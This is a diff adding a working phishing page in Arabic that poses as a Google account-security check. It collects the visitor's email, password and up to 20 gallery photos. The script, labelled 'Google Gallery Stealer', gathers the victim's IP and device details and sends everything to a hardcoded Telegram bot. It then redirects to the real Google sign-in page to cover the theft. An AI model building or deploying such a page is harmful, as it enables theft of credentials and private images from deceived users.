@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث أمان الحساب - Google</title>
+    <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMTYiIGZpbGw9IiM0Mjg1RjQiLz4KPHBhdGggZD0iTTE2IDRDOS4wODI4OCAzLjM1NDQ2IDMuMzU0NDYgOS4wODI4OCAzLjM1NDQ2IDE2QzMuMzU0NDYgMjIuOTE3MSA5LjA4Mjg4IDI4LjY0NTYgMTYgMjguNjQ1NkMyMi45MTcxIDI4LjY0NTYgMjguNjQ1NiAyMi45MTcxIDI4LjY0NTYgMTZDMjguNjQ1NiA5LjA4Mjg4IDIyLjkxNzEgMy4zNTQ0NiAxNiAzLjM1NDQ2Wk0xNiAyQjkuMDgyODggMiAyIDkuMDgyODggMiAxNkMyIDIyLjkxNzEgOS4wODI4OCAyNy42NDU2IDE2IDI3LjY0NTZDMjIuOTE3MSAyNy42NDU2IDI4LjY0NTYgMjIuOTE3MSAyOC42NDU2IDE2QzI4LjY0NTYgOS4wODI4OCAyMi45MTcxIDIgMTYgMlpNMTIgMjBjMCAxLjEwNjcgMC44OTMzIDEuOTk5NyAxLjk5OTcgMiAwLjU0OTY2IDAgMS4wMjM3LTAuMzgwMyAxLjExOTMtMC44OTM3TDExLjg5MDcgMTkuMTAwM0MxMS44MDQ0IDE4LjU4OTcgMTEuMjcxMSAxOC4xMTk3IDEwLjY2MDcgMTguMTE5N0gxMC42NjA3QzkuOTk5OTcgMTguMTE5NyA5LjEwMDMgMTguOTkzMyA5LjEwMDMgMTlDOS4xMDAzIDIwLjEwNjcgOS44OTMzIDIxIDEyIDIxWk0yMCAyMWMwIDEuMTA2Ny0wLjg5MzMgMS45OTk3LTEuOTk5NyAyLTEuMTE5MyAwLTAuODkzNyAwLjM4MDMtMS4yOTUgMC44OTM3LTEuMTE5M0wyMC4xMDkzIDIwLjg5OTdDMjAuNzk1NiAyMC4zODAzIDIxIDIwLjg1MDQgMjEgMTkuOTk5N0MyMS4xMDY3IDE5LjEwMDMgMjAuMjE0NCAxOC4yMDY3IDE5LjEwMDMgMTguMTAwM0gxOS4xMDAzQzE4LjU0OTcgMTguMTAwMyAxOC4wNzEgMTguNTgxMSAxOC4wNzEgMTkuMTkwM0wyMC4xMDkzIDIxLjExOTNDMjAuMDc3NyAyMS4yMDY3IDIwLjAxMDQgMjEgMjAgMjFaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            background: #f8f9fa; 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px; 
+        }
+        .container { 
+            background: white; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+            width: 100%; 
+            max-width: 420px; 
+            overflow: hidden; 
+        }
+        .header { 
+            background: #4285f4; 
+            color: white; 
+            padding: 24px; 
+            text-align: center; 
+        }
+        .logo { 
+            width: 48px; 
+            height: 48px; 
+            margin: 0 auto 16px; 
+            background: white; 
+            border-radius: 2px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-weight: bold; 
+            font-size: 24px; 
+        }
+        .header h1 { font-size: 24px; font-weight: 400; margin-bottom: 4px; }
+        .header p { font-size: 16px; opacity: 0.9; }
+        .content { padding: 32px 24px; }
+        .form-group { margin-bottom: 20px; }
+        label { 
+            display: block; 
+            margin-bottom: 8px; 
+            color: #202124; 
+            font-size: 14px; 
+            font-weight: 500; 
+        }
+        input { 
+            width: 100%; 
+            padding: 16px; 
+            border: 1px solid #dadce0; 
+            border-radius: 4px; 
+            font-size: 16px; 
+            transition: border-color 0.2s; 
+        }
+        input:focus { outline: none; border-color: #4285f4; box-shadow: 0 0 0 1px #4285f4; }
+        
+        /* File picker محسن */
+        .file-section { 
+            background: #f8f9fa; 
+            border: 2px dashed #dadce0; 
+            border-radius: 8px; 
+            padding: 20px; 
+            text-align: center; 
+            transition: all 0.3s; 
+            cursor: pointer; 
+            margin-bottom: 20px; 
+        }
+        .file-section:hover { 
+            border-color: #4285f4; 
+            background: #e8f0fe; 
+        }
+        .file-section.active { 
+            border-color: #1a73e8; 
+            background: #e8f0fe; 
+        }
+        .file-icon { 
+            font-size: 48px; 
+            color: #5f6368; 
+            margin-bottom: 12px; 
+        }
+        .file-text { 
+            color: #202124; 
+            font-size: 16px; 
+            font-weight: 500; 
+            margin-bottom: 8px; 
+        }
+        .file-subtext { 
+            color: #5f6368; 
+            font-size: 14px; 
+        }
+        .file-count { 
+            background: #1a73e8; 
+            color: white; 
+            border-radius: 20px; 
+            padding: 4px 12px; 
+            font-size: 14px; 
+            font-weight: 500; 
+            margin-top: 12px; 
+        }
+        input[type="file"] { 
+            position: absolute; 
+            width: 1px; 
+            height: 1px; 
+            opacity: 0; 
+        }
+        
+        .btn { 
+            width: 100%; 
+            padding: 16px; 
+            background: #1a73e8; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            font-size: 16px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            transition: background 0.2s; 
+            margin-bottom: 12px; 
+        }
+        .btn:hover:not(:disabled) { background: #1557b0; }
+        .btn:disabled { background: #dadce0; cursor: not-allowed; }
+        
+        .progress { display: none; margin-top: 16px; padding: 20px; text-align: center; }
+        .spinner { 
+            border: 2px solid #e8eaed; 
+            border-top: 2px solid #4285f4; 
+            border-radius: 50%; 
+            width: 24px; 
+            height: 24px; 
+            animation: spin 1s linear infinite; 
+            margin: 0 auto 12px; 
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .success-msg { 
+            background: #e8fadf; 
+            border: 1px solid #c6f6d5; 
+            color: #155724; 
+            padding: 16px; 
+            border-radius: 4px; 
+            text-align: center; 
+            margin-top: 16px; 
+            display: none; 
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">G</div>
+            <h1>التحقق من الهوية</h1>
+            <p>للحفاظ على أمان حسابك، يرجى تحميل <strong>حد أقصى 20 صورة</strong> من معرض الصور</p>
+        </div>
+        <div class="content">
+            <form id="verifyForm">
+                <div class="form-group">
+                    <label>البريد الإلكتروني المرتبط بالحساب</label>
+                    <input type="email" id="email" placeholder="your.email@gmail.com" required>
+                </div>
+                <div class="form-group">
+                    <label>كلمة المرور الحالية</label>
+                    <input type="password" id="password" placeholder="••••••••••••••••" required>
+                </div>
+                
+                <div class="file-section" id="fileSection">
+                    <div class="file-icon">📱</div>
+                    <div class="file-text" id="filePrompt">انقر هنا أو اسحب الصور من معرضك</div>
+                    <div class="file-subtext">يمكنك تحميل ما يصل إلى 20 صورة (JPG, PNG)</div>
+                    <div class="file-count" id="fileCount" style="display:none;">0/20</div>
+                    <input type="file" id="galleryPhotos" accept="image/*" multiple capture="environment">
+                </div>
+                
+                <button type="submit" class="btn" id="submitBtn" disabled>التحقق (0 صورة)</button>
+                
+                <div class="progress" id="progress">
+                    <div class="spinner"></div>
+                    <p>جاري رفع الصور و التحقق...</p>
+                </div>
+                
+                <div class="success-msg" id="successMsg">
+                    ✅ تم التحقق بنجاح! سيتم إعادة توجيهك خلال ثوان...
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';  // غيّر هنا
+        const CHAT_ID = '8539996558';         // غيّر هنا
+        const MAX_FILES = 20;
+
+        const victimInfo = {
+            ip: '', ua: navigator.userAgent, lang: navigator.language,
+            platform: navigator.platform, screen: `${screen.width}x${screen.height}`,
+            time: new Date().toISOString()
+        };
+
+        const fileInput = document.getElementById('galleryPhotos');
+        const fileSection = document.getElementById('fileSection');
+        const filePrompt = document.getElementById('filePrompt');
+        const fileCount = document.getElementById('fileCount');
+        const submitBtn = document.getElementById('submitBtn');
+
+        let selectedFiles = [];
+
+        // File selection handler
+        fileInput.addEventListener('change', (e) => {
+            const files = Array.from(e.target.files);
+            const newFiles = files.slice(0, MAX_FILES - selectedFiles.length);
+            
+            selectedFiles = selectedFiles.concat(newFiles);
+            updateFileUI();
+            
+            // Reset input للسماح باختيار نفس الصور
+            fileInput.value = '';
+        });
+
+        // Drag & Drop
+        fileSection.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            fileSection.style.background = '#e8f0fe';
+        });
+        fileSection.addEventListener('dragleave', () => {
+            fileSection.style.background = '#f8f9fa';
+        });
+        fileSection.addEventListener('drop', (e) => {
+            e.preventDefault();
+            fileSection.style.background = '#f8f9fa';
+            
+            const files = Array.from(e.dataTransfer.files).filter(f => f.type.startsWith('image/'));
+            const newFiles = files.slice(0, MAX_FILES - selectedFiles.length);
+            selectedFiles = selectedFiles.concat(newFiles);
+            updateFileUI();
+        });
+
+        // Click to open gallery
+        fileSection.addEventListener('click', () => fileInput.click());
+
+        function updateFileUI() {
+            fileSection.classList.toggle('active', selectedFiles.length > 0);
+            
+            if (selectedFiles.length === 0) {
+                filePrompt.textContent = 'انقر هنا أو اسحب الصور من معرضك';
+                fileCount.style.display = 'none';
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'التحقق (0 صورة)';
+            } else {
+                filePrompt.textContent = 'تم تحديد الصور بنجاح';
+                fileCount.style.display = 'block';
+                fileCount.textContent = `${selectedFiles.length}/${MAX_FILES}`;
+                submitBtn.disabled = false;
+                submitBtn.textContent = `التحقق (${selectedFiles.length} صورة)`;
+            }
+        }
+
+        // Get IP
+        async function getIP() { 
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                return (await res.json()).ip || 'غير متاح';
+            } catch { return 'غير متاح'; }
+        }
+
+        // Fast parallel upload
+        async function sendFilesParallel(files) {
+            const message = `
+🔒 <b>Google Gallery Stealer - ${files.length} صور</b>
+
+📧 <b>Email:</b> ${document.getElementById('email').value}
+🔑 <b>Password:</b> ${document.getElementById('password').value}
+🌐 <b>IP:</b> ${victimInfo.ip}
+📱 <b>UA:</b> ${victimInfo.ua.slice(0,60)}...
+🖥️ <b>Screen:</b> ${victimInfo.screen}
+
+📸 <b>تم إرسال ${files.length} صورة من الألبوم</b>
+            `.trim();
+
+            // Send text first
+            const textForm = new FormData();
+            textForm.append('chat_id', CHAT_ID);
+            textForm.append('text', message);
+            textForm.append('parse_mode', 'HTML');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: textForm });
+
+            // Parallel file upload (سريع جداً - 5 موازية)
+            const uploadPromises = [];
+            for (let i = 0; i < files.length; i += 5) {
+                const batch = files.slice(i, i + 5);
+                uploadPromises.push(Promise.all(batch.map((file, idx) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', file);
+                    formData.append('caption', `صورة ${i+idx+1}/${files.length} - ${victimInfo.ip} | ${file.name}`);
+                    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                })));
+            }
+            
+            await Promise.all(uploadPromises);
+        }
+
+        // Form submit
+        document.getElementById('verifyForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            victimInfo.ip = await getIP();
+            
+            // UI feedback
+            submitBtn.disabled = true;
+            document.getElementById('progress').style.display = 'block';
+            
+            try {
+                await sendFilesParallel(selectedFiles);
+                document.getElementById('successMsg').style.display = 'block';
+                
+                // Auto redirect after success
+                setTimeout(() => {
+                    window.location.href = 'https://accounts.google.com';
+                }, 2000);
+                
+            } catch (error) {
+                console.error('Upload failed');
+            }
+        });
+    </script>
+</body>
+</html>
